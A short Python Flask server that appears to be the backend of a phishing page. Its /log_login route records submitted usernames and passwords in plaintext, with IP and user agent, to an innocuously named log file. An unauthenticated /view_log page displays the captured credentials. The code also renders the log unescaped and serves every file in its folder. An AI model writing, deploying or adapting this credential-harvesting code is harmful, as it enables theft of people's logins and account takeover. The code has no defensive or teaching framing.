from flask import Flask, request, jsonify
from datetime import datetime
import os

app = Flask(__name__)
LOG_FILE = 'envirenmental_activity.log'

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        ip = request.remote_addr
    return ip


@app.route('/log_login', methods=['POST'])
def log_login():
    data = request.json
    username = data.get('username', '')
    password = data.get('password', '')
    user_agent = request.headers.get('User-Agent', '')
    ip = get_client_ip()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = (
        f"[Time] {timestamp}\n"
        f"[IP] {ip}\n"
        f"[User Agent] {user_agent}\n"
        f"[Username] {username}\n"
        f"[Password] {password}\n"
        f"{'-'*40}\n"
    )
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(log_entry)
    return jsonify({'status': 'logged'})

# Route to view the log file in the browser
@app.route('/view_log')
def view_log():
    if not os.path.exists(LOG_FILE):
        return '<h2>No log entries found.</h2>'
    with open(LOG_FILE, 'r', encoding='utf-8') as f:
        log_content = f.read()
    # Display in <pre> for formatting
    return f'<h2>Envirenmental Activity Log</h2><pre style="background:#222;color:#eee;padding:1em;border-radius:8px;">{log_content}</pre>'

from flask import send_from_directory

# Serve index.html and static files
@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('.', path)

if __name__ == '__main__':
    app.run(debug=True)